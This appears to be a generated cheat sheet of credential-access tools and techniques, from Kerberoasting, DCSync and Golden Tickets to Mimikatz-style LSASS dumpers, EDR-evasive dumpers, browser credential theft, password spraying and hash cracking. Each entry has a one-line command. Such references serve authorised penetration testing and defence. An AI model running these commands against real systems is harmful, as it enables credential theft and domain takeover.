# Credential Access & Cracking
> Source: HackTools | Entries: 33 | Platform: cross_platform


## Index

- [active_directory](#activedirectory)
- [browser_credential_theft](#browsercredentialtheft)
- [Credential Access](#credential-access)
- [credential_access](#credentialaccess)
- [credential_dumping](#credentialdumping)
- [edr_evasion](#edrevasion)
- [email_security](#emailsecurity)
- [kerberos_attack](#kerberosattack)
- [lateral_movement](#lateralmovement)
- [macos_security](#macossecurity)
- [online_brute_force](#onlinebruteforce)
- [password_cracking](#passwordcracking)
- [password_spraying](#passwordspraying)
- [Post-Exploitation](#post-exploitation)
- [web_application_testing](#webapplicationtesting)


### active_directory

#### AS-REP Roasting
Active Directory attack technique targeting accounts with Kerberos pre-authentication disabled, allowing attackers to...
**Categories:** active_directory, credential_access, kerberos_attack, technique, offline_cracking
```
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat
```

#### DCSync
Active Directory attack technique that abuses directory replication permissions (DS-Replication-Get-Changes and DS-Re...
**Categories:** active_directory, credential_access, domain_attack, technique, lateral_movement
```
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

#### Golden Ticket
Kerberos attack technique that forges Ticket Granting Tickets (TGT) using the krbtgt account's NTLM hash, granting un...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence, domain_dominance
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

#### Kerberoasting
Active Directory attack technique that requests Kerberos service tickets (TGS) for accounts with Service Principal Na...
**Categories:** active_directory, credential_access, kerberos_attack, technique, offline_cracking
```
GetUserSPNs.py domain.local/user:password -dc-ip 10.0.0.1 -request
```

#### Silver Ticket
Kerberos attack technique that forges service tickets (TGS) using a compromised service account's NTLM hash, granting...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence
```
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt
```

### browser_credential_theft

#### ThunderFox
Extracts credentials, cookies, and history from Firefox and Thunderbird profiles. Decrypts stored passwords by access...
**Categories:** browser_credential_theft, credential_dumping, application_credential_access, cookie_theft
```
ThunderFox.exe --target firefox --command creds
```

### Credential Access

#### Rubeus
C# Kerberos attack toolkit for performing kerberoasting, AS-REP roasting, ticket forging, constrained/unconstrained d...
**Categories:** Credential Access, Miscellaneous
```
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

### credential_access

#### Internal-Monologue
Retrieves NTLM challenge-response hashes without touching LSASS by invoking local NTLM authentication via SSPI. Imper...
**Categories:** credential_access, ntlm_theft, sspi_abuse, token_manipulation
```
InternalMonologue.exe
```

### credential_dumping

#### BetterSafetyKatz
Enhanced fork of SafetyKatz that dynamically fetches the latest Mimikatz release, patches known signatures at runtime...
**Categories:** credential_dumping, lsass_access, in_memory_execution, signature_evasion
```
BetterSafetyKatz.exe
```

#### HandleKatz
LSASS credential dumper that clones an existing handle to LSASS rather than opening a new one. Leverages handles alre...
**Categories:** credential_dumping, lsass_access, handle_manipulation, edr_evasion
```
HandleKatz.exe --pid:lsass_pid --outfile:C:\Temp\dump.bin
```

#### LaZagne
Multi-platform credential recovery tool that extracts passwords stored by browsers, email clients, databases, Wi-Fi,...
**Categories:** credential_dumping, browser_credential_theft, password_recovery, application_credential_access
```
lazagne.exe all
```

#### Mimikatz
Post-exploitation credential dumping tool that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets...
**Categories:** credential_dumping, lsass_access, kerberos_attack, pass_the_hash, golden_ticket
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

#### Nanodump
LSASS process memory dumper that uses syscalls and multiple evasion techniques to create a minidump of LSASS while av...
**Categories:** credential_dumping, lsass_access, edr_evasion, syscall_abuse
```
nanodump.exe --write C:\Temp\out.dmp
```

#### PPLdump
Tool that exploits the Windows Protected Process Light (PPL) mechanism to dump the memory of protected processes incl...
**Categories:** credential_dumping, lsass_access, ppl_bypass, process_protection_bypass
```
PPLdump.exe lsass.exe lsass.dmp
```

#### Pypykatz
Pure Python implementation of Mimikatz. Parses LSASS minidump files, live LSASS memory, and registry hives to extract...
**Categories:** credential_dumping, lsass_access, offline_credential_extraction, cross_platform
```
pypykatz lsa minidump lsass.dmp
```

#### SafetyKatz
Modified version of Mimikatz that creates a minidump of LSASS using .NET and then runs Mimikatz in-memory against the...
**Categories:** credential_dumping, lsass_access, in_memory_execution, dotnet_abuse
```
SafetyKatz.exe
```

#### secretsdump.py
Impacket module that remotely dumps SAM, LSA secrets, cached credentials, and NTDS.dit from domain controllers over S...
**Categories:** credential_dumping, dcsync, remote_credential_access, smb_based_attack, active_directory
```
secretsdump.py domain/user:password@target
```

#### SharpDPAPI
C# implementation of DPAPI (Data Protection Application Programming Interface) abuse for decrypting Windows secrets....
**Categories:** credential_dumping, dpapi_abuse, browser_credential_theft, vault_decryption
```
SharpDPAPI.exe triage
```

#### SharpKatz
Pure C# port of Mimikatz credential extraction functionality. Implements sekurlsa module natively in .NET without req...
**Categories:** credential_dumping, lsass_access, dotnet_abuse, in_memory_execution
```
SharpKatz.exe --Command logonpasswords
```

### edr_evasion

#### PPLBlade
Protected Process Light (PPL) exploitation tool that bypasses Windows process protection to dump or manipulate protec...
**Categories:** edr_evasion, credential_dumping, ppl_bypass, defense_evasion
```
PPLBlade.exe --mode dump --name lsass.exe --output lsass.dmp
```

### email_security

#### MailSniper
PowerShell-based tool for searching through email in Microsoft Exchange and Office 365 environments for sensitive dat...
**Categories:** email_security, credential_testing, password_spraying, exchange_security, post_exploitation
```
Invoke-SelfSearch -Mailbox user@target.com -ExchHostname mail.target.com -Terms 'password','credentials'
```

#### o365spray
Microsoft Office 365 user enumeration and password spraying tool that identifies valid accounts and tests credentials...
**Categories:** email_security, credential_testing, password_spraying, azure_ad_security, user_enumeration
```
o365spray --enum -U users.txt -d target.com
```

### kerberos_attack

#### Rubeus
C# toolset for raw Kerberos interaction and abuse. Performs AS-REP roasting, Kerberoasting, ticket requests, renewals...
**Categories:** kerberos_attack, kerberoasting, asrep_roasting, delegation_abuse, credential_access
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

### lateral_movement

#### CrackMapExec
Swiss army knife for pentesting Active Directory networks. Automates credential validation, command execution, and cr...
**Categories:** lateral_movement, credential_validation, password_spraying, active_directory, remote_execution
```
crackmapexec smb 192.168.1.0/24 -u admin -p Password123
```

### macos_security

#### MacPEAS
macOS privilege escalation enumeration script (part of the PEASS family) that performs comprehensive system reconnais...
**Categories:** macos_security, privilege_escalation, enumeration, credential_access, post_exploitation
```
bash linpeas.sh -a
```

#### SwiftBelt
macOS post-exploitation enumeration tool written in Swift that gathers system information, security configurations, a...
**Categories:** macos_security, post_exploitation, enumeration, credential_access
```
./SwiftBelt
```

### online_brute_force

#### Hydra
Fast online password brute-forcing tool supporting 50+ protocols including SSH, RDP, SMB, HTTP, FTP, LDAP, MSSQL, and...
**Categories:** online_brute_force, password_spraying, credential_stuffing, network_attack
```
hydra -l admin -P passwords.txt ssh://192.168.1.100
```

### password_cracking

#### hashcat
GPU-accelerated password cracking tool supporting 300+ hash types including NTLM, Kerberos, NTLMv2, WPA, and applicat...
**Categories:** password_cracking, offline_cracking, gpu_accelerated, hash_cracking
```
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

#### John the Ripper
Versatile password cracker supporting hundreds of hash and cipher types. Includes auto-detection of hash formats, cus...
**Categories:** password_cracking, offline_cracking, hash_cracking, password_auditing
```
john --wordlist=rockyou.txt hashes.txt
```

### password_spraying

#### DomainPasswordSpray
PowerShell-based password spraying tool for Active Directory. Enumerates domain users via LDAP and tests a single pas...
**Categories:** password_spraying, active_directory, credential_access, powershell_attack
```
Invoke-DomainPasswordSpray -Password Winter2024!
```

#### Spray
Lightweight password spraying tool for Active Directory environments. Tests a single password against multiple accoun...
**Categories:** password_spraying, credential_access, active_directory, online_brute_force
```
spray.sh -smb 192.168.1.100 users.txt passwords.txt 1 1 corp.local
```

### Post-Exploitation

#### GhostPack
Suite of offensive C# tools for Active Directory attacks, credential theft, and privilege escalation. Includes Rubeus...
**Categories:** Post-Exploitation, Credential Access, Miscellaneous
```
Rubeus.exe kerberoast /outfile:hashes.txt
```

### web_application_testing

#### jwt_tool
JWT security testing toolkit for token manipulation, vulnerability scanning, and attack automation. Detectable throug...
**Categories:** web_application_testing, authentication_testing, token_manipulation
```
python jwt_tool.py eyJhbGci... -C -d common_secrets.txt
```
